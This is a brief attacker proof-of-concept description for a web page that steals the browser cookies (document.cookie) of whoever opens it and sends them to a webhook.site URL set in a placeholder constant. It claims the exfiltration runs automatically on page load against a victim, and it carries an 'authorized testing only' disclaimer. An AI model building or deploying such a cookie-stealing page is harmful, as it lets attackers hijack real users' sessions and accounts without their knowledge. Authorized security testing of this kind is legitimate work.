Attacker PoC: Cookie Exfiltration Page

For authorized testing only. Use only on targets you own or have explicit permission to test.

This page will send document.cookie to a webhook URL (replace the placeholder with your webhook.site URL).

Replace the placeholder below before use:

const WEBHOOK_URL = "https://webhook.site/YOUR-UNIQUE-ID-HERE";

The page will automatically run the exfiltration when opened by a victim in the same browser context.
